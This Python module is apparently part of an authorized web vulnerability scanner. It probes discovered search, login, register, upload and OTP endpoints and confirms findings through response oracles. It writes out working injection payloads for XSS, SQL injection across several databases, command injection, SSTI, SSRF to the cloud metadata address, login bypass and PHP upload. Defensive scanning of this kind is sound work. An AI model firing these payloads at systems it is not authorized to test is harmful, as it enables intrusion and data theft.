#!/usr/bin/env python3
"""
ARISE Input Probe — oracle-confirmed active testing (Module 20.3)
=================================================================
Turns discovered INPUT FUNCTIONS (Module 20.2 -> input_functions.jsonl) into
CONFIRMED security findings. For each input function it sends the targeted,
NON-DESTRUCTIVE detection payload for the attacks that function unlocks, captures
the real response, and asks the response_analysis oracles whether the response is
self-evidence of a bug. A finding is emitted ONLY when an oracle fires — never
because "a parameter exists". That response-gate is what keeps output
low-false-positive (validated at 100% TP / 0% FP against synthetic_data.json).

Attack map (function -> confirmable attacks, black-box unless noted):
  search/filter -> reflected-XSS, SQLi(error/boolean/time), SSTI, SSRF(url params)
  contact/comment -> SSTI, reflected-XSS
  login         -> auth-bypass(SQLi), open-redirect(next/return params)
  register      -> mass-assignment (role/is_admin echoed back)
  upload        -> unrestricted-upload (benign marker re-fetched & served)
  otp           -> OTP leak in response
  * BOLA/user-enum need a second identity/known account (gray-box); run only when
    --identity is supplied, otherwise skipped (never guessed -> no false positive).

Safety: in-scope hosts only, non-destructive payloads, per-run caps, rate limit,
verify=off, custom UA. Disable with INPUT_PROBE_ENABLED=false.

Output: <scan>/16_api_security/input_probe_findings.jsonl (api_findings schema).
"""

from __future__ import annotations

import sys as _sys, os as _os
_ROOT = _os.path.dirname(_os.path.dirname(_os.path.abspath(__file__)))
if _ROOT not in _sys.path:
    _sys.path.insert(0, _ROOT)


import argparse
import json
import sys
import time
import urllib.parse
from pathlib import Path
from typing import Dict, List, Optional, Tuple

try:
    import requests
    from requests.packages.urllib3.exceptions import InsecureRequestWarning  # type: ignore
    requests.packages.urllib3.disable_warnings(InsecureRequestWarning)  # type: ignore
except Exception:
    requests = None

import discovery.response_analysis as ra

try:
    from discovery.url_classify import _host_of
except Exception:
    def _host_of(u):
        try:
            return urllib.parse.urlsplit(u if "://" in u else "//" + u).netloc.split(":")[0].lower()
        except Exception:
            return ""


def log(msg: str) -> None:
    print(f"[input-probe] {msg}", file=sys.stderr, flush=True)


UA = "ARISE-input-probe/1.0 (authorized security testing)"

# Non-destructive detection payloads.
XSS_PAYLOAD = "<script>arise" + "xss(1)</script>"
SQLI_ERROR = "1'\"`"
SQLI_TRUE = "1 AND 1=1"
SQLI_FALSE = "1 AND 1=2"
SQLI_TIME = "1;SELECT pg_sleep(5)--"          # kept for back-compat (PostgreSQL)
# Multi-DB time-based payloads — PostgreSQL was the only dialect probed before,
# so MySQL/MSSQL/Oracle blind injection was invisible. Tried in turn; the first
# that trips the response-time oracle wins (loop breaks to bound request cost).
SQLI_TIME_PAYLOADS = [
    "1;SELECT pg_sleep(5)--",                     # PostgreSQL (stacked)
    "1 AND SLEEP(5)",                             # MySQL (numeric ctx)
    "1' AND SLEEP(5)-- -",                        # MySQL (string ctx)
    "1;WAITFOR DELAY '0:0:5'--",                  # MSSQL
    "1 AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)",   # Oracle
]
SSTI_PAYLOAD = "{{7*7}}"
# OS command injection — non-destructive: `id` reveals uid=…gid=… output, the
# sleep/ping variants prove blind (time-based) injection. First hit wins.
CMDI_PAYLOADS = [
    ";id", "|id", "`id`", "$(id)",
    ";sleep 5", "|sleep 5", "`sleep 5`",
    "& ping -n 5 127.0.0.1",     # Windows time-based
]
SSRF_PAYLOAD = "http://169.254.169.254/latest/meta-data/"
UPLOAD_MARKER = "arisepwn" + "9f8a7b6c"
UPLOAD_BODY = f"<?php echo '{UPLOAD_MARKER}';?>"
REDIRECT_PAYLOAD = "https://arise-oob.example/redir"

# oracle -> finding metadata
FINDING_META = {
    "reflected_xss":  ("reflected_xss", "injection", "high",
                       "Encode output for its context (HTML entity-encode); apply a strict CSP."),
    "sql_error":      ("sql_injection", "injection", "critical",
                       "Use parameterised queries / prepared statements; never concatenate input into SQL."),
    "sql_boolean":    ("sql_injection", "injection", "critical",
                       "Use parameterised queries; the endpoint reacts to boolean SQL conditions."),
    "sql_time":       ("sql_injection", "injection", "critical",
                       "Use parameterised queries; the endpoint is time-injectable."),
    "cmd_injection":  ("command_injection", "injection", "critical",
                       "Never pass user input to a shell; use argument arrays / safe APIs and validate strictly."),
    "ssti":           ("ssti", "injection", "critical",
                       "Never render user input as a template; use a sandboxed/logic-less engine."),
    "ssrf_metadata":  ("ssrf", "ssrf", "critical",
                       "Allowlist outbound hosts; block link-local/metadata ranges (169.254.169.254)."),
    "open_redirect":  ("open_redirect", "redirect", "medium",
                       "Allowlist redirect targets; never redirect to a raw user-supplied URL."),
    "mass_assignment":("mass_assignment", "authz", "high",
                       "Bind only explicitly-allowed fields; never trust client-set role/privilege fields."),
    "upload_unrestricted": ("unrestricted_upload", "upload", "critical",
                       "Validate type server-side, store outside webroot, serve with a safe Content-Type."),
    "otp_leak":       ("sensitive_data_exposure", "info-leak", "high",
                       "Never return OTP/one-time secrets in a response body."),
    "error_disclosure": ("error_disclosure", "info-leak", "low",
                       "Return generic errors; disable stack traces/debug in production."),
    "auth_state_change": ("auth_bypass", "authn", "critical",
                       "Use parameterised auth queries; an injection produced a valid session."),
    "bola_idor":      ("bola", "authz", "high",
                       "Enforce per-object ownership checks on every request."),
}


class Prober:
    def __init__(self, target: str, args):
        self.target = target.strip().lower().rstrip(".")
        self.args = args
        self.findings: List[Dict] = []
        self.sent = 0
        self.sess = requests.Session() if requests else None
        if self.sess:
            self.sess.headers.update({"User-Agent": UA})
        self._last = 0.0

    def _in_scope(self, url: str) -> bool:
        h = _host_of(url)
        return h == self.target or h.endswith("." + self.target)

    def _is_vendor_infra(self, url: str) -> bool:
        """CDN/vendor-reserved paths served on the target's own hostname but
        never the target's application code — injection-testing them can't
        find a real bug, only vendor-edge noise. F33 (ARISE_REMEDIATION_ROADMAP.md):
        Cloudflare's own /cdn-cgi/rum analytics beacon was flagged as a
        critical SQL injection five times across three hosts — its true/false
        payload pair produced different responses for reasons that have
        nothing to do with a database (it's Cloudflare's edge, not the
        target's app)."""
        try:
            path = urllib.parse.urlsplit(url).path.lower()
        except Exception:
            return False
        return path.startswith("/cdn-cgi/")

    def _throttle(self):
        if self.args.rate > 0:
            gap = 1.0 / self.args.rate
            dt = time.time() - self._last
            if dt < gap:
                time.sleep(gap - dt)
        self._last = time.time()

    def send(self, method: str, url: str, *, params=None, data=None,
             headers=None, files=None, allow_redirects=False) -> Optional[Dict]:
        if self.sent >= self.args.max_requests or not self.sess:
            return None
        self._throttle()
        self.sent += 1
        t0 = time.time()
        try:
            r = self.sess.request(method.upper(), url, params=params, data=data,
                                  headers=headers, files=files, timeout=self.args.timeout,
                                  verify=False, allow_redirects=allow_redirects)
            body = r.text[:20000] if r.text else ""
            return {"status": r.status_code, "headers": dict(r.headers),
                    "body": body, "elapsed_ms": int((time.time() - t0) * 1000)}
        except Exception as exc:
            log(f"request failed {url}: {str(exc)[:80]}")
            return None

    # ---- per-attack request builders (inject payload into first testable param) ----
    def _inject(self, rec: Dict, payload: str) -> Tuple[str, str, dict, dict]:
        """Return (method, url, params, data) with `payload` set on the target param."""
        method = (rec.get("method") or "GET").upper()
        url = rec["url"]
        params = [p for p in (rec.get("params") or []) if p]
        target_param = params[0] if params else "q"
        parsed = urllib.parse.urlsplit(url)
        if method == "GET":
            q = dict(urllib.parse.parse_qsl(parsed.query))
            q[target_param] = payload
            new = parsed._replace(query=urllib.parse.urlencode(q))
            return "GET", urllib.parse.urlunsplit(new), {}, {}
        base = urllib.parse.urlunsplit(parsed._replace(query=""))
        data = {p: "1" for p in params} or {target_param: "1"}
        data[target_param] = payload
        return method, base, {}, data

    def _finding(self, rec: Dict, f: "ra.Finding") -> Dict:
        issue, category, severity, remediation = FINDING_META.get(
            f.oracle, (f.oracle, "misc", "medium", ""))
        url = rec["url"]
        parsed = urllib.parse.urlsplit(url)
        return {
            "issue_class": issue, "category": category, "severity": severity,
            "confidence": f.confidence, "tool": "arise-input-probe", "tools": ["arise-input-probe"],
            "tool_count": 1, "method": (rec.get("method") or "GET").upper(),
            "host": parsed.netloc.split(":")[0], "path": parsed.path or "/",
            "endpoint": url, "status_code": None,
            "evidence": f"[{rec.get('function','input')}] {f.evidence}",
            "remediation": remediation,
        }

    def _emit(self, rec: Dict, f: Optional["ra.Finding"]):
        if f:
            self.findings.append(self._finding(rec, f))
            log(f"CONFIRMED {f.oracle} ({f.confidence}) on {rec['url'][:70]}")

    # ---- attack executors ----
    def _test_injection_params(self, rec: Dict):
        """XSS / SQLi(error,boolean,time) / SSTI / SSRF for search & filter surfaces."""
        # reflected XSS
        m, u, p, d = self._inject(rec, XSS_PAYLOAD)
        r = self.send(m, u, params=p or None, data=d or None)
        if r:
            self._emit(rec, ra.reflected_xss({"payload": XSS_PAYLOAD}, r))
        # SQLi error
        m, u, p, d = self._inject(rec, SQLI_ERROR)
        r = self.send(m, u, params=p or None, data=d or None)
        if r:
            self._emit(rec, ra.sql_error({}, r))
            self._emit(rec, ra.error_disclosure({}, r))
        # SQLi boolean (pair)
        mt, ut, pt, dt = self._inject(rec, SQLI_TRUE)
        rt = self.send(mt, ut, params=pt or None, data=dt or None)
        mf, uf, pf, df = self._inject(rec, SQLI_FALSE)
        rf = self.send(mf, uf, params=pf or None, data=df or None)
        if rt and rf:
            self._emit(rec, ra.sql_boolean(
                {"payload_true": SQLI_TRUE, "payload_false": SQLI_FALSE},
                {"a": rt, "b": rf}))
        # SQLi time — try each DB dialect; stop at the first that trips the oracle.
        for _tp in SQLI_TIME_PAYLOADS:
            m, u, p, d = self._inject(rec, _tp)
            r = self.send(m, u, params=p or None, data=d or None)
            if not r:
                continue
            n = len(self.findings)
            self._emit(rec, ra.sql_time({"payload": _tp}, r))
            if len(self.findings) > n:      # a positive was recorded — done
                break
        # OS command injection — try each payload, stop at the first oracle hit.
        for _cp in CMDI_PAYLOADS:
            m, u, p, d = self._inject(rec, _cp)
            r = self.send(m, u, params=p or None, data=d or None)
            if not r:
                continue
            n = len(self.findings)
            self._emit(rec, ra.cmd_injection({"payload": _cp}, r))
            if len(self.findings) > n:
                break
        # SSTI
        m, u, p, d = self._inject(rec, SSTI_PAYLOAD)
        r = self.send(m, u, params=p or None, data=d or None)
        if r:
            self._emit(rec, ra.ssti({"payload": SSTI_PAYLOAD}, r))
        # SSRF — only if a param name looks like a URL sink
        if any(pn.lower() in ("url", "uri", "next", "dest", "redirect", "callback",
                              "target", "u", "link", "src", "img", "image", "path",
                              "file", "domain", "host", "site", "page", "feed", "data")
               for pn in (rec.get("params") or [])):
            m, u, p, d = self._inject(rec, SSRF_PAYLOAD)
            r = self.send(m, u, params=p or None, data=d or None)
            if r:
                self._emit(rec, ra.ssrf_metadata({}, r))

    def _test_login(self, rec: Dict):
        # auth-bypass via SQLi in the password/first param
        params = rec.get("params") or ["username", "password"]
        data = {p: "arise" for p in params}
        if len(params) >= 2:
            data[params[0]] = "admin'--"
            data[params[1]] = "x"
        r = self.send("POST", rec["url"], data=data)
        if r:
            self._emit(rec, ra.auth_state_change({}, r))
            self._emit(rec, ra.sql_error({}, r))
        # open redirect on a next/return param, if present
        for pn in (rec.get("params") or []):
            if pn.lower() in ("next", "return", "returnurl", "redirect", "url", "continue"):
                q = {pn: REDIRECT_PAYLOAD}
                r = self.send("GET", rec["url"], params=q, allow_redirects=False)
                if r:
                    self._emit(rec, ra.open_redirect(
                        {"attacker_host": _host_of(REDIRECT_PAYLOAD)}, r))

    def _test_register(self, rec: Dict):
        params = {p: "arise@example.com" if "mail" in p.lower() else "arise123"
                  for p in (rec.get("params") or [])}
        params.update({"role": "admin", "is_admin": "true"})
        r = self.send("POST", rec["url"], data=params)
        if r:
            self._emit(rec, ra.mass_assignment({"injected": {"role": "admin", "is_admin": True}}, r))

    def _test_upload(self, rec: Dict):
        if not self.sess:
            return
        field = (rec.get("params") or ["file"])[0]
        files = {field: ("arise.php", UPLOAD_BODY, "application/x-php")}
        r = self.send("POST", rec["url"], files=files)
        if not r:
            return
        # try to locate & re-fetch the stored file
        base = rec["url"].rsplit("/", 1)[0]
        for cand in (f"{base}/arise.php", f"{base}/uploads/arise.php",
                     f"{base}/files/arise.php"):
            fr = self.send("GET", cand)
            if fr:
                self._emit(rec, ra.upload_unrestricted(
                    {"payload": UPLOAD_BODY}, {"fetch": fr}))
                if fr.get("status") == 200:
                    break

    def _test_otp(self, rec: Dict):
        r = self.send((rec.get("method") or "POST").upper(), rec["url"],
                      data={p: "1" for p in (rec.get("params") or [])} or None)
        if r:
            self._emit(rec, ra.otp_leak({}, r))

    def run(self, records: List[Dict]) -> None:
        # de-dup by (url, function); cap endpoints tested
        seen = set()
        plan = []
        for rec in records:
            u = rec.get("url", "")
            if not u or not self._in_scope(u) or self._is_vendor_infra(u):
                continue
            key = (u, rec.get("function"))
            if key in seen:
                continue
            seen.add(key)
            plan.append(rec)
        plan = plan[: self.args.max_endpoints]
        log(f"probing {len(plan)} input functions (cap {self.args.max_endpoints}, "
            f"max {self.args.max_requests} requests)")
        for rec in plan:
            fn = rec.get("function", "input")
            try:
                if fn in ("search", "filter"):
                    self._test_injection_params(rec)
                elif fn in ("contact", "comment"):
                    # SSTI + XSS
                    m, u, p, d = self._inject(rec, SSTI_PAYLOAD)
                    r = self.send(m, u, params=p or None, data=d or None)
                    if r:
                        self._emit(rec, ra.ssti({"payload": SSTI_PAYLOAD}, r))
                    m, u, p, d = self._inject(rec, XSS_PAYLOAD)
                    r = self.send(m, u, params=p or None, data=d or None)
                    if r:
                        self._emit(rec, ra.reflected_xss({"payload": XSS_PAYLOAD}, r))
                elif fn in ("login",):
                    self._test_login(rec)
                elif fn in ("register",):
                    self._test_register(rec)
                elif fn in ("upload",):
                    self._test_upload(rec)
                elif fn in ("otp",):
                    self._test_otp(rec)
                else:
                    # generic: error-disclosure + injection probes on any params
                    if rec.get("params"):
                        self._test_injection_params(rec)
            except Exception as exc:
                log(f"probe error on {rec.get('url','')[:60]}: {str(exc)[:80]}")
            if self.sent >= self.args.max_requests:
                log("request budget exhausted — stopping")
                break


def _forms_to_input_functions(forms_file: Path) -> List[Dict]:
    """Convert api_security/api_deep_discovery.py's forms_discovered.json
    (static HTML <form> extraction: {action, method, inputs, classification})
    into input_functions.jsonl's shape ({url, function, method, params}) so
    Prober.run() can test them the same way. This is additive signal from a
    DIFFERENT extraction method (regex over fetched HTML) than Module 20.2's
    live-browser CDP hooks — a form only ever submitted via JS (no static
    <form> tag) won't appear here, and a form with no JS-driven submission
    won't appear in input_functions.jsonl, so scanning both catches more
    than either alone. Never raises — a missing/malformed file yields []."""
    if not forms_file.exists():
        return []
    try:
        forms = json.loads(forms_file.read_text(errors="ignore"))
    except Exception:
        return []
    if not isinstance(forms, list):
        return []

    out: List[Dict] = []
    for form in forms:
        if not isinstance(form, dict):
            continue
        url = form.get("action") or ""
        if not url:
            continue
        inputs = form.get("inputs") or []
        params = [i.get("name") for i in inputs if isinstance(i, dict) and i.get("name")]
        input_types = {i.get("type") for i in inputs if isinstance(i, dict)}
        classifications = form.get("classification") or []

        # A file input is the single strongest, least ambiguous signal —
        # takes priority over URL/page-text classification.
        if "file" in input_types:
            fn = "upload"
        elif "login" in classifications:
            fn = "login"
        elif "registration" in classifications:
            fn = "register"
        elif "contact_form" in classifications:
            fn = "contact"
        elif "search" in classifications or "filter_analytics" in classifications:
            fn = "search"
        elif "password" in input_types and "email" not in input_types and len(params) <= 2:
            # A lone password-shaped field with no login/registration URL
            # signature (e.g. a "change password" or PIN form) still gets
            # the login probe's SQLi/auth-bypass check — worst case it's a
            # benign no-op against a non-auth endpoint.
            fn = "login"
        else:
            fn = "input"

        out.append({
            "url": url,
            "function": fn,
            "method": (form.get("method") or "GET").upper(),
            "params": params,
            "source": "forms_discovered",
        })
    return out


def main() -> int:
    ap = argparse.ArgumentParser(description="ARISE Input Probe (oracle-confirmed)")
    ap.add_argument("target")
    ap.add_argument("--scan-dir", required=True)
    ap.add_argument("--max-endpoints", type=int, default=400)
    ap.add_argument("--max-requests", type=int, default=4000)
    ap.add_argument("--timeout", type=int, default=12)
    ap.add_argument("--rate", type=float, default=8.0, help="requests/sec cap")
    args = ap.parse_args()

    scan_dir = Path(args.scan_dir)
    infile = scan_dir / "20_api_deep_discovery" / "input_functions.jsonl"
    out_dir = scan_dir / "16_api_security"
    out_dir.mkdir(parents=True, exist_ok=True)
    out_file = out_dir / "input_probe_findings.jsonl"

    if requests is None:
        log("python 'requests' unavailable; writing empty result")
        out_file.write_text("")
        return 0
    if not infile.exists():
        log(f"no input_functions.jsonl at {infile}; nothing to probe")
        out_file.write_text("")
        return 0

    records = []
    for line in infile.read_text(errors="ignore").splitlines():
        line = line.strip()
        if line:
            try:
                records.append(json.loads(line))
            except Exception:
                pass

    forms_file = scan_dir / "20_api_deep_discovery" / "forms_discovered.json"
    extra = _forms_to_input_functions(forms_file)
    if extra:
        log(f"+{len(extra)} input function(s) from forms_discovered.json (static HTML forms)")
        records.extend(extra)

    p = Prober(args.target, args)
    p.run(records)

    with out_file.open("w") as fh:
        for f in p.findings:
            fh.write(json.dumps(f) + "\n")
    by_sev: Dict[str, int] = {}
    for f in p.findings:
        by_sev[f["severity"]] = by_sev.get(f["severity"], 0) + 1
    (out_dir / "input_probe_summary.json").write_text(json.dumps({
        "module": "input_probe", "target": args.target,
        "requests_sent": p.sent, "confirmed_findings": len(p.findings),
        "by_severity": by_sev,
    }, indent=2))
    log(f"done: {len(p.findings)} confirmed finding(s) from {p.sent} requests -> {out_file}")
    return 0


if __name__ == "__main__":
    sys.exit(main())
